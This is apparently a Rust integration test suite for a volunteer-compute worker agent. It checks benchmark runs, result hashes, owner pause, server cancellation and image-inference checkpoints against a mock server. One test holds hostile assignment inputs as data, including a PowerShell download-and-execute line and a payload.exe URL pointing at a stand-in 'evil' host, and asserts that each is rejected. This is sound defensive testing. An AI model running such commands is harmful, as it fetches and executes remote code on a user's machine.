//! Assignments arriving from the "network" (a mock control plane) through the real
//! heartbeat loop, executor and sandbox binary.

mod common;

use std::sync::Arc;
use std::time::Duration;

use common::{creds, server_cfg};
use ghost_agent::configuration::Limits;
use ghost_agent::configuration::settings::{OwnerControl, SettingsStore};
use ghost_agent::execution::Executor;
use ghost_agent::execution::sandbox::Sandbox;
use ghost_agent::monitoring::{Sample, Snapshot};
use ghost_agent::networking::ApiClient;
use ghost_agent::networking::heartbeat::HeartbeatLoop;
use ghost_agent::runtime::{AgentInfo, Shared};
use ghost_agent::scheduler::Policy;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use tokio::sync::watch;
use uuid::Uuid;
use wiremock::matchers::{method, path, path_regex};
use wiremock::{Mock, MockServer, Request, ResponseTemplate};

fn snapshot() -> Snapshot {
    let s = Sample {
        cpu_percent: 5.0,
        ram_total_mb: 16000,
        ram_used_mb: 4000,
        on_battery: Some(false),
        ..Default::default()
    };
    Snapshot { latest: s.clone(), avg: s, max_temperature_c: Some(45.0), samples: 3 }
}

struct Rig {
    shared: Arc<Shared>,
    stop: watch::Sender<bool>,
    task: tokio::task::JoinHandle<ghost_agent::networking::heartbeat::Exit>,
    _snap: watch::Sender<Snapshot>,
    _dirs: (tempfile::TempDir, tempfile::TempDir),
}

async fn start(s: &MockServer) -> Rig {
    let (snap_tx, snapshots) = watch::channel(snapshot());
    let data = tempfile::tempdir().unwrap();
    let work = tempfile::tempdir().unwrap();
    let limits = Limits { resume_after_secs: 0, require_idle_secs: 0, ..Limits::default() };
    let shared = Arc::new(Shared::new(
        AgentInfo {
            version: "t".into(),
            name: "pc".into(),
            worker_id: Uuid::new_v4(),
            device_id: Uuid::new_v4(),
            server_url: s.uri(),
            execution_available: true,
        },
        ghost_agent::hardware::detect(),
        snapshots,
        SettingsStore::new(data.path()),
        OwnerControl::Started,
        limits.clone(),
    ));
    let client = Arc::new(ApiClient::new(&server_cfg(&s.uri()), Some(creds(&s.uri()))).unwrap());
    let sandbox = Sandbox::new(env!("CARGO_BIN_EXE_ghost-sandbox").into(), work.path().to_path_buf());
    let executor = Executor::new(client.clone(), shared.clone(), sandbox, 2);
    let hb = HeartbeatLoop {
        client,
        policy: Policy::new(limits, true),
        shared: shared.clone(),
        interval: Duration::from_millis(100),
        executor: Some(executor),
    };
    let (stop, rx) = watch::channel(false);
    let task = tokio::spawn(hb.run(rx));
    Rig { shared, stop, task, _snap: snap_tx, _dirs: (data, work) }
}

async fn mount_auth(s: &MockServer) {
    Mock::given(path("/v1/workers/auth"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({ "accessToken": "v1.t", "expiresIn": 900 })))
        .mount(s)
        .await;
    Mock::given(path("/v1/worker/me/stats"))
        .respond_with(ResponseTemplate::new(200).set_body_json(
            json!({ "tasks": { "succeeded": 0, "failed": 0, "preempted": 0, "active": 0 }, "computeSeconds": 0, "credits": 0, "recent": [] }),
        ))
        .mount(s)
        .await;
    Mock::given(path_regex(r"^/v1/worker/assignments/.+/(accept|progress|reject|result)$"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({})))
        .mount(s)
        .await;
}

/// First heartbeat returns `assignments`, later ones return none.
async fn mount_heartbeat(s: &MockServer, assignments: Value) {
    Mock::given(path("/v1/worker/heartbeat"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_json(json!({ "heartbeatIntervalSeconds": 1, "assignments": assignments })),
        )
        .up_to_n_times(1)
        .mount(s)
        .await;
    Mock::given(path("/v1/worker/heartbeat"))
        .respond_with(
            ResponseTemplate::new(200).set_body_json(json!({ "heartbeatIntervalSeconds": 1, "assignments": [] })),
        )
        .mount(s)
        .await;
}

fn assignment(id: Uuid, ty: &str, input: Value) -> Value {
    json!({ "assignmentId": id, "jobId": Uuid::new_v4(), "name": "Benchmark do Fulano", "type": ty, "input": input,
            "resources": { "cpuCores": 1, "ramMb": 128 }, "timeoutSeconds": 30 })
}

async fn calls(s: &MockServer, id: Uuid, action: &str) -> Vec<Request> {
    let p = format!("/v1/worker/assignments/{id}/{action}");
    s.received_requests().await.unwrap().into_iter().filter(|r| r.url.path() == p).collect()
}

async fn wait_for(s: &MockServer, id: Uuid, action: &str) -> Vec<Request> {
    for _ in 0..100 {
        let c = calls(s, id, action).await;
        if !c.is_empty() {
            return c;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    panic!("no {action} for {id}");
}

#[tokio::test]
async fn runs_a_benchmark_and_reports_a_verifiable_result() {
    let s = MockServer::start().await;
    mount_auth(&s).await;
    let id = Uuid::new_v4();
    mount_heartbeat(
        &s,
        json!([assignment(id, "benchmark", json!({ "kind": "primes", "size": 1000, "iterations": 2 }))]),
    )
    .await;
    let rig = start(&s).await;

    let result = wait_for(&s, id, "result").await;
    let body: Value = serde_json::from_slice(&result[0].body).unwrap();
    assert_eq!(body["status"], "completed");
    assert_eq!(body["output"]["checksum"], "00000000000000a8");
    // Same check the control plane does: sha256(JSON.stringify(output)).
    let sha = hex::encode(Sha256::digest(serde_json::to_string(&body["output"]).unwrap()));
    assert_eq!(body["outputSha256"], sha);
    assert_eq!(calls(&s, id, "accept").await.len(), 1);
    assert!(calls(&s, id, "reject").await.is_empty());

    // Heartbeats declared the registered type.
    let hb: Value = serde_json::from_slice(
        &s.received_requests().await.unwrap().iter().find(|r| r.url.path() == "/v1/worker/heartbeat").unwrap().body,
    )
    .unwrap();
    assert_eq!(hb["workloadTypes"], json!(["benchmark", "image-inference"]));
    assert_eq!(rig.shared.status().workloads.len(), 0);
    rig.stop.send(true).unwrap();
    rig.task.await.unwrap();
}

#[tokio::test]
async fn hostile_assignments_are_declined_without_running_anything() {
    let s = MockServer::start().await;
    mount_auth(&s).await;
    let cases: Vec<(Uuid, &str, Value)> = vec![
        (Uuid::new_v4(), "shell", json!({ "cmd": "whoami" })),
        (Uuid::new_v4(), "powershell", json!("Invoke-WebRequest http://evil | iex")),
        (Uuid::new_v4(), "script", json!({ "lang": "js", "code": "require('child_process')" })),
        (Uuid::new_v4(), "exe", json!({ "url": "http://evil/payload.exe" })),
        (Uuid::new_v4(), "wasm", json!({ "module": "AGFzbQEAAAA=" })),
        (Uuid::new_v4(), "benchmark", json!({ "kind": "hash", "iterations": 1, "command": "calc.exe" })),
        (Uuid::new_v4(), "benchmark", json!({ "kind": "hash", "iterations": 1, "path": "C:\\Users" })),
        (Uuid::new_v4(), "benchmark", json!({ "kind": "hash", "iterations": 1e12 })),
    ];
    let list: Vec<Value> = cases.iter().map(|(id, ty, input)| assignment(*id, ty, input.clone())).collect();
    mount_heartbeat(&s, json!(list)).await;
    let rig = start(&s).await;

    for (id, ty, _) in &cases {
        let reject = wait_for(&s, *id, "reject").await;
        let body: Value = serde_json::from_slice(&reject[0].body).unwrap();
        let reason = body["reason"].as_str().unwrap();
        assert!(reason.contains("not registered") || reason.contains("invalid parameters"), "{ty}: {reason}");
        assert!(calls(&s, *id, "accept").await.is_empty(), "{ty} was accepted");
        assert!(calls(&s, *id, "result").await.is_empty(), "{ty} ran");
    }
    rig.stop.send(true).unwrap();
    rig.task.await.unwrap();
}

#[tokio::test]
async fn owner_pause_kills_the_workload_and_reroutes_it() {
    let s = MockServer::start().await;
    mount_auth(&s).await;
    let id = Uuid::new_v4();
    mount_heartbeat(&s, json!([assignment(id, "benchmark", json!({ "kind": "hash", "iterations": 50_000_000 }))]))
        .await;
    let rig = start(&s).await;

    wait_for(&s, id, "accept").await;
    for _ in 0..50 {
        if !rig.shared.status().workloads.is_empty() {
            break;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    let w = rig.shared.status().workloads;
    assert_eq!(w.len(), 1, "running workload visible to the desktop app");
    assert_eq!(w[0].job_name, "Benchmark do Fulano");

    let t = std::time::Instant::now();
    rig.shared.set_control(OwnerControl::Paused).unwrap();
    let result = wait_for(&s, id, "result").await;
    assert!(t.elapsed() < Duration::from_secs(3), "pause took {:?}", t.elapsed());
    let body: Value = serde_json::from_slice(&result[0].body).unwrap();
    assert_eq!(body["status"], "failed");
    assert_eq!(body["retryable"], true);
    assert!(body["error"].as_str().unwrap().starts_with("preempted"));
    rig.stop.send(true).unwrap();
    rig.task.await.unwrap();
}

#[tokio::test]
async fn server_cancellation_stops_the_workload_silently() {
    let s = MockServer::start().await;
    mount_auth(&s).await;
    let id = Uuid::new_v4();
    Mock::given(method("POST"))
        .and(path("/v1/worker/heartbeat"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({
            "heartbeatIntervalSeconds": 1,
            "assignments": [assignment(id, "benchmark", json!({ "kind": "hash", "iterations": 50_000_000 }))]
        })))
        .up_to_n_times(1)
        .mount(&s)
        .await;
    Mock::given(path("/v1/worker/heartbeat"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_json(json!({ "heartbeatIntervalSeconds": 1, "cancelAssignmentIds": [id] })),
        )
        .mount(&s)
        .await;
    let rig = start(&s).await;
    wait_for(&s, id, "accept").await;
    for _ in 0..60 {
        tokio::time::sleep(Duration::from_millis(100)).await;
        if rig.shared.status().workloads.is_empty() && calls(&s, id, "accept").await.len() == 1 {
            break;
        }
    }
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(rig.shared.status().workloads.is_empty(), "still running after cancel");
    assert!(calls(&s, id, "result").await.is_empty(), "no result after server cancel");
    rig.stop.send(true).unwrap();
    rig.task.await.unwrap();
}

// ---- image-inference ----------------------------------------------------------------

fn digit_fixtures(n: usize) -> Vec<(Vec<u8>, u8)> {
    let dir = concat!(env!("CARGO_MANIFEST_DIR"), "/../workloads/image-inference/testdata");
    let mut v: Vec<_> = std::fs::read_dir(dir)
        .unwrap()
        .map(|e| e.unwrap().path())
        .filter(|p| p.extension().is_some_and(|e| e == "png"))
        .collect();
    v.sort();
    v.into_iter()
        .take(n)
        .map(|p| {
            let label = p.to_string_lossy().split("label").nth(1).unwrap().as_bytes()[0] - b'0';
            (std::fs::read(&p).unwrap(), label)
        })
        .collect()
}

fn inference_assignment(id: Uuid, images: &[(Vec<u8>, u8)], checkpoint: Option<Value>) -> Value {
    let refs: Vec<Value> = images
        .iter()
        .enumerate()
        .map(|(i, (b, _))| json!({ "index": i, "sha256": hex::encode(Sha256::digest(b)), "size": b.len() }))
        .collect();
    let mut a = assignment(id, "image-inference", json!({ "images": refs, "accelerator": "cpu", "topK": 2 }));
    a["resources"]["ramMb"] = 256.into();
    if let Some(c) = checkpoint {
        a["checkpoint"] = c;
    }
    a
}

async fn serve_image(s: &MockServer, id: Uuid, index: usize, bytes: Vec<u8>) {
    Mock::given(method("GET"))
        .and(path(format!("/v1/worker/assignments/{id}/images/{index}")))
        .respond_with(ResponseTemplate::new(200).set_body_bytes(bytes))
        .mount(s)
        .await;
}

#[tokio::test]
async fn image_batch_resumes_from_checkpoint_and_returns_all_results() {
    let s = MockServer::start().await;
    mount_auth(&s).await;
    let id = Uuid::new_v4();
    let fx = digit_fixtures(6);
    // A previous attempt already classified images 0 and 1.
    let done = |i: usize, label: u8| json!({ "index": i, "label": label, "confidenceBp": 9000, "topK": [{ "label": label, "confidenceBp": 9000 }] });
    let checkpoint = json!({ "items": [done(0, fx[0].1), done(1, fx[1].1)] });
    for (i, (b, _)) in fx.iter().enumerate() {
        serve_image(&s, id, i, b.clone()).await;
    }
    mount_heartbeat(&s, json!([inference_assignment(id, &fx, Some(checkpoint))])).await;
    let rig = start(&s).await;

    let result = wait_for(&s, id, "result").await;
    let body: Value = serde_json::from_slice(&result[0].body).unwrap();
    assert_eq!(body["status"], "completed", "{body}");
    let out = &body["output"];
    assert_eq!((out["count"].as_u64(), out["resumed"].as_u64(), out["failed"].as_u64()), (Some(6), Some(2), Some(0)));
    assert_eq!(out["accelerator"], "cpu");
    for (i, (_, label)) in fx.iter().enumerate() {
        assert_eq!(out["items"][i]["index"], i);
        assert_eq!(out["items"][i]["label"], *label);
    }
    let sha = hex::encode(Sha256::digest(serde_json::to_string(out).unwrap()));
    assert_eq!(body["outputSha256"], sha);
    // Only the missing images were downloaded.
    let downloads: Vec<String> = s
        .received_requests()
        .await
        .unwrap()
        .into_iter()
        .map(|r| r.url.path().to_string())
        .filter(|p| p.contains("/images/"))
        .collect();
    assert_eq!(downloads.len(), 4, "{downloads:?}");
    assert!(!downloads.iter().any(|p| p.ends_with("/images/0") || p.ends_with("/images/1")));
    rig.stop.send(true).unwrap();
    rig.task.await.unwrap();
}

#[tokio::test]
async fn tampered_image_fails_the_attempt_but_keeps_a_checkpoint() {
    let s = MockServer::start().await;
    mount_auth(&s).await;
    let id = Uuid::new_v4();
    let fx = digit_fixtures(3);
    serve_image(&s, id, 0, fx[0].0.clone()).await;
    serve_image(&s, id, 1, fx[1].0.clone()).await;
    serve_image(&s, id, 2, b"MZ this is not the image you hashed".to_vec()).await;
    mount_heartbeat(&s, json!([inference_assignment(id, &fx, None)])).await;
    let rig = start(&s).await;

    let result = wait_for(&s, id, "result").await;
    let body: Value = serde_json::from_slice(&result[0].body).unwrap();
    assert_eq!(body["status"], "failed");
    assert_eq!(body["retryable"], true);
    assert!(body["error"].as_str().unwrap().contains("does not match its hash"), "{body}");
    // Before failing, the finished images were saved for the next attempt.
    let progress = calls(&s, id, "progress").await;
    let last: Value = serde_json::from_slice(&progress.last().expect("checkpoint sent").body).unwrap();
    let items = last["checkpoint"]["items"].as_array().unwrap();
    assert_eq!(items.iter().map(|i| i["index"].as_u64().unwrap()).collect::<Vec<_>>(), vec![0, 1]);
    assert_eq!(items[1]["label"], fx[1].1);
    rig.stop.send(true).unwrap();
    rig.task.await.unwrap();
}
